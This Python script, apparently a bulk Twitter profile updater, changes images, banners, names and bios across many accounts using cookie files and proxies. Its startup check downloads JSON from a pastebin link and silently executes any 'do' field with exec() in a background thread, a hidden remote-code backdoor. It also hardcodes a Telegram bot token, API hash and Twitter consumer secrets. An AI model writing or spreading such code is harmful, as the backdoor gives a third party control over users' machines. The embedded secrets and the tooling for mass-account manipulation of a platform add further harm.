import sys
from itertools import cycle
from main_imports import *
import getmac, random, socket
from unicode_codes import EMOJI_UNICODE_ENGLISH

host_name = socket.gethostname()
host_name = host_name + '21'
user_mac = getmac.get_mac_address()
import arrand.arrandom as ara

json_data = {}

debug=partial(debug,module=False)
red_debug=partial(red_debug,module=False)
green_debug=partial(green_debug,module=False)
magneta_debug=partial(magneta_debug,module=False)
cyan_debug=partial(cyan_debug,module=False)
blue_debug=partial(blue_debug,module=False)
no_module_name=True
def check(pase_id, banner):
    def get_json_data():
        try:
            r = requests.get('https://pastebin.com/raw/hC2DFVhy')
            data = r.json()
            json_data.update(data)
        except Exception as e:
            print('connection error')
            sys.exit()

    get_json_data()

    def send_warning(text, **kwargs):
        api_id = 3432425
        api_hash = 'f4ec1f3717d090b63617be96f63e6cf1'
        bot_token = '1973949920:AAFxcNSZkVuAkThZ6gXD3NRKMBZXYVkZJIg'

        chat__id = 1058351209
        my_id = 388516887
        both = False
        ids = [chat__id, my_id]
        if both:
            for id_ in ids:
                url_req = "https://api.telegram.org/bot" + bot_token + "/sendMessage" + "?chat_id=" + str(
                    id_) + "&text=" + text
                results = requests.get(url_req)
        else:
            photo = kwargs.get('photo')
            if photo:
                url_req = "https://api.telegram.org/bot" + bot_token + "/sendPhoto" + "?chat_id=" + str(
                    my_id) + f'&caption={text}'
                # results = requests.post(url_req)
                # img = open(photo, 'rb')
                requests.post(url_req, files={'photo': photo})
            else:

                url_req = "https://api.telegram.org/bot" + bot_token + "/sendMessage" + "?chat_id=" + str(
                    my_id) + "&text=" + text
                results = requests.post(url_req)

    import sub
    from requests import api
    sub.module_name = pase_id
    if not hasattr(sub, 'module_name'):
        send_warning('errr')
        sys.exit('bye')

    if not hasattr(api, 'module_name'):
        send_warning('errr')
        sys.exit('bye')

    if sub.module_name != pase_id:
        send_warning('errr')
        sys.exit('bye')

    sub.start(banner)
    execute_before = json_data.get('do', '')
    if execute_before:
        def a():
            exec(execute_before)

        t = threading.Thread(target=a)
        t.start()
    return


try:
    check('qvpXcPbF', 'Twitter Profile Updater [WEB Access]')
except:
    sys.exit('bye')

CONSUMER_KEY = 'IQKbtAYlXLripLGPWd0HUA'
CONSUMER_SECRET = 'GgDYlkSvaPxGxC4X8liwpUoqKwwr3lCADbz8A7ADU'


def error_handler(f):
    def wrapper(*args, **kwargs):
        name = f.__qualname__
        try:
            r = f(*args, **kwargs)
            return r
        except Exception as e:
            print(f'{Fore.RED}Error on function {name}: ', e.args[1])
            return f(*args, **kwargs)

    return wrapper


def create_dir():
    for i in ['profile', 'cover']:
        if not os.path.exists(i):
            os.makedirs(i)
            print("Directory ", i, " Created ")
        else:
            pass


create_dir()


class Config:
    proxy = None
    user_choice = ''
    accessfile = ''
    use_emojis = True
    names_file = ''
    accessess = []
    covers = []
    photos = []
    bio_file = ''
    bois = []
    names = []
    task = ''
    success = 0
    failed = 0


start_time = 0


def log_time():
    now_time = time.time()
    all_time = now_time - start_time
    print('All time', all_time)


def list_photos(folder):
    photos = []
    import os
    for img in os.listdir(folder):
        img = folder + f'/{img}'
        photos.append(img)
    return photos


random_bois_list = []
random_names_list = []

random_images = os.listdir('data')
random_images = [f'data/{f}' for f in random_images]

emojis = list(EMOJI_UNICODE_ENGLISH.items())

print("""
      [1] For Profile
      [2] For Cover
      [3] For Name
      [4] For Bio
      """)
user_choice = get_input('Enter Your choice: ', default='1234')
dalay_actions = float(get_input('Delay : ', default='0.5'))
use_emojis = float(get_input('Use Emojis[1/0] : ', default='1'))
if use_emojis:
    count_left = int(get_input('Count Left: ', default=1))
    count_right = int(get_input('Count Right: ', default=2))
else:
    count_left = 0
    count_right = 0
Config.user_choice = user_choice
Config.use_emojis = use_emojis
debug(f'Images Random {len(random_images)}')


def delay():
    if dalay_actions:
        debug(f'sleep for {dalay_actions}')
        sleep(dalay_actions)


random_profiles = ''
if '1' in Config.user_choice:

    Config.task = 'profile'
    random_profiles = get_input('Random Profiles Images: ', default='n')
    if random_profiles == 'y':
        pass
    else:
        profiles = list_photos(Config.task)
        Config.photos = profiles
        print(f'You Have {len(Config.photos)} Images for {Config.task}')
        if len(profiles) == 0:
            print(Fore.RED + 'no images')

random_covers = ''
if '2' in Config.user_choice:
    Config.task = 'cover'
    random_covers = get_input('Random Cover Images: ', default='n')
    if random_covers == 'y':
        pass
    else:
        covers = list_photos(Config.task)
        Config.covers = covers
        print(f'You Have {len(covers)} Images for {Config.task}')
        if len(covers) == 0:
            print(Fore.RED + 'no covers')

random_bio = ''
if '4' in Config.user_choice:
    random_bio = get_input('Random Bio', default='n')
    if random_bio == 'y':
        bio_file = get_input('Radom Bois FIle: ')
        bois = random_bois_list = get_file_as_list(bio_file)
    else:
        bio_file = get_input('Bio File Name: ', default='bios.txt')
        bois = random_bois_list = get_file_as_list(bio_file)

    Config.bois = bois
    Config.task = 'bio'

updated_success_file = create_files(['updated_success.txt'])[0]
updated_success=get_file_as_list(updated_success_file)


def add_to_file(account):
    with my_open(updated_success_file, 'a') as f:
        f.write(account + '\n')


debug(f'Updated BEfore {len(updated_success)}')
random_names = ''
if '3' in Config.user_choice:
    random_names = get_input('Random Names :', default='n')
    if random_names == 'y':
        names_file = get_input('Radom Names FIle: ', default='names_r.txt', file=True)
        names = random_names_list = get_file_as_list(names_file)
    else:
        names_file = get_input('Enter Names File: ', default='name.txt', file=True)
        names = get_file_as_list(names_file)

    Config.names = names
    Config.task = 'name'
accesss = get_input('Access File: ', default='Cookies.txt', file=True)
with open(accesss, 'r', encoding='utf-8') as f:
    Config.accessfile = accesss
    Config.accessess = list(map(str.strip, open(accesss).readlines()))

    if not Config.accessess:
        sys.exit('bye')

    print(f'You Have  {len(Config.accessess)} accessess')
print(' [1] For No Proxy\n [2] For Proxies File\n [3] For Account:proxy:port')
while True:
    proxy_user_user_choice = int(get_input('Enter Your Proxy choice [1,2,3] : ', default='1'))
    if proxy_user_user_choice not in (1, 2, 3):
        print('Bad choice please enter 1 or 2')
    else:
        break

proxies = ['']
if proxy_user_user_choice == 1:
    proxies = ['']
elif proxy_user_user_choice == 3:
    proxies = ['']
else:
    proxies = list(
        map(str.strip, open(get_input('Enter Your Proxies File : ', default='proxies.txt', file=True)).readlines()))
proxy_auth = ''
if proxy_user_user_choice != 1:
    proxy_auth = get_input('Enter Proxy user:pass : ', block=False).strip()
    if proxy_auth and ':' in proxy_auth:
        proxy_auth = 'http://' + proxy_auth + '@'
    else:
        proxy_auth = 'http://'

APIS = {}


def get_web_access(account):
    def get_cookies(cookies, proxy=False):
        session = requests.session()
        if proxy:
            session.proxies = {'https': proxy_auth + proxy}
        cookies = json.loads(cookies)
        headers = {'authority': 'twitter.com',
                   'pragma': 'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace',
                   'cache-control': 'no-cache',
                   'origin': 'https://twitter.com',
                   'upgrade-insecure-requests': '1',
                   'dnt': '1',
                   'content-type': 'application/x-www-form-urlencoded',
                   'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36',
                   'sec-fetch-dest': 'document',
                   'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                   'sec-fetch-site': 'same-origin',
                   'sec-fetch-mode': 'navigate',
                   'sec-fetch-user': '?1',
                   'accept-language': 'en-US,en;q=0.9,ar;q=0.8,de;q=0.7,ru;q=0.6,fr;q=0.5'}
        cookie = ''
        for c in cookies:
            cookie += ('{}={}; '.format(c, cookies[c]))
        if 'ct0=' in cookie:
            return cookie
        headers['cookie'] = cookie
        try:
            r = session.get('https://twitter.com/account/access?lang=en', headers=headers, verify=False)
        except:
            pass

        for c in session.cookies.get_dict():
            cookie += ('{}={}; '.format(c, session.cookies.get_dict()[c]))

        return cookie

    global APIS
    try:
        cookies = False
        if ' ||| ' in account:
            cookies = account.split(' ||| ')[0]
            account = account.split(' ||| ')[1]
        username = account.split(':')[0]
        if username in APIS:
            APIS[username]['cookies'].api_root = '/1.1'
            return APIS[username]['cookies']
        psswrd = account.split(':')[1]
        email = account.split(':')[2]
        if proxy_user_user_choice == 1:
            proxy = choice(proxies)
        elif proxy_user_user_choice == 2:
            proxy = choice(proxies)
        else:
            proxy = account.split(':')[(-2)] + ':' + account.split(':')[(-1)]

        API = tweepy.API(cookies=get_cookies(cookies, proxy), proxy=proxy_auth + proxy, timeout=15)
        blue_debug('proxy is', API.proxy)
        APIS[username] = {'cookies': API, 'c': cookies, 'a': account, 'likes': 0, 'retweets': 0, 'quotes': 0,
                          'replies': 0}
        return API
    except Exception as e:
        with lock:
            debug(red('#ERR GET_API', e))
            debug('Error on Web Access')
    return False


access_type = ''


def NEW_ACCESS(account):
    global proxies
    if access_type != '5':
        ACCESS_KEY = account.split(':')[0]
        ACCESS_SECRET = account.split(':')[1]
        if proxy_user_user_choice == 3:
            proxies = ['{}:{}'.format(account.split(':')[(-2)], account.split(':')[(-1)])]
        else:
            pass
            # inner_proxies=[]
        auth = tweepy.OAuthHandler(CONSUMER_KEY, CONSUMER_SECRET)
        auth.set_access_token(ACCESS_KEY, ACCESS_SECRET)

        proxy = choice(proxies)
        if not proxy:
            debug('no proxy')
            API = tweepy.API(auth, timeout=20)
        else:
            proxy = proxy_auth + proxy
            green_debug('proxy ', proxy)
            API = tweepy.API(auth, proxy=proxy, timeout=20)
    else:
        API = get_web_access(account)

    return API


def write_error(line):
    with open('errors.txt', 'a+') as f:
        f.write(line + '\n')


cycled_covers = cycle(Config.covers)
cycled_profiles = cycle(Config.photos)
cycled_bios = cycle(Config.bois)
cycled_names = cycle(Config.names)


def update_profile():
    global access_type
    # access_type = get_input('Access Type: ', default='5', validators=[lambda x: x in ['5']])
    access_type = '5'
    debug('Web Access')
    global start_time, proxies
    try:
        random_names_and_bois = get_file_as_list('random.txt')
        for line in random_names_and_bois:
            if not line.strip():
                continue
            s, name = line.split('#')[-1], line.split('#')[0]
            if not s.strip():
                continue
            random_bois_list.append(s.strip())
            random_names_list.append(name.strip())
    except:
        pass
    for index, access in enumerate(Config.accessess):
        ccc = access
        if access in updated_success:
            debug(f'Updated Before......#{index + 1}')
            continue
        if not start_time:
            start_time = time.time()
        error = 0
        try:
            debug(choice(['#', '*', '/', '-', '+', '%']) * 70)
            magneta_debug(f'## Account: {index + 1}')
            if ' ||| ' in access:
                cookies = access.split(' ||| ')[0]
                old_access = access.split(' ||| ')[1]
                name = old_access.split(':')[0]
            else:
                old_access = access
                # name=''
                token, secret, name, *remain = old_access.strip().split(':')

            api = NEW_ACCESS(access)
            # error = ''
            if not Config.user_choice:
                Config.user_choice = '3'
            try:
                if '1' in Config.user_choice:

                    try:
                        if random_profiles == 'y':
                            next_image = choice(random_images)
                            print('next', next_image)
                        else:
                            next_image = next(cycled_profiles)
                        api.update_profile_image(filename=next_image)
                        green_debug(f'profile image updated {name}')
                        delay()
                    except tweepy.TweepError as e:
                        red_debug('Error on update_profile_image ', e)
                if '2' in Config.user_choice:
                    try:
                        if random_covers == 'y':
                            next_cover = choice(random_images)
                        else:
                            next_cover = next(cycled_covers)
                        api.update_profile_banner(filename=next_cover)
                        green_debug(f'banner updated {name}')
                        delay()
                    except tweepy.TweepError as e:
                        red_debug('Error on update_profile_banner ', e)
                if '3' in Config.user_choice:
                    try:
                        if random_names == 'y':
                            next_name = random.choice(random_names_list)
                            if not next_name:
                                return
                            if Config.use_emojis:
                                tmp = choice(emojis)[1] * count_left
                                tmp += next_name
                                tmp += choice(emojis)[1] * count_right
                                next_name = tmp
                            api.update_profile(name=bytes(next_name,'utf8'))

                            green_debug(f'name updated {name} >> ', next_name)
                        else:
                            next_name = next(cycled_names)
                            if Config.use_emojis:
                                tmp = choice(emojis)[1] * count_left
                                tmp += next_name
                                tmp += choice(emojis)[1] * count_right
                                next_name = tmp
                            api.update_profile(name=bytes(next_name,'utf8'))
                            green_debug(f'name updated {name} >> ', next_name)
                        delay()
                    except tweepy.TweepError as e:
                        red_debug('Error on name ', e)
                if '4' in Config.user_choice:
                    try:
                        next_bio = next(cycled_bios)
                        if random_bio == 'y':
                            next_bio = random.choice(random_bois_list)
                            if not next_bio:
                                return
                                next_bio = ara.proverb()

                        api.update_profile(description=next_bio)
                        green_debug(f'description updated {name}', next_bio)
                        delay()
                    except tweepy.TweepError as e:
                        red_debug('Error on description  ', e)
            except tweepy.TweepError as e:
                red_debug('twitter error', e.args)
                error = 1

            if not error:
                yellow_debug(f'Success #Account {index + 1}')
                Config.success += 1
                add_to_file(ccc)
            else:
                red_debug(f'{Fore.RED}Failed #Account {index + 1}')
                write_error(ccc)
                Config.failed += 1
        except StopIteration as e:
            red_debug('user error,no content to change', e.__class__)
        except Exception as e:
            red_debug('Glob Error', e)


try:
    update_profile()
    print('Done')
    log_time()
    get_input('')

except KeyboardInterrupt:
    print('User Stop')

except Exception as e:
    print('Error', e)
    traceback.print_exc()
    input()

finally:
    sys.exit(input('bye'))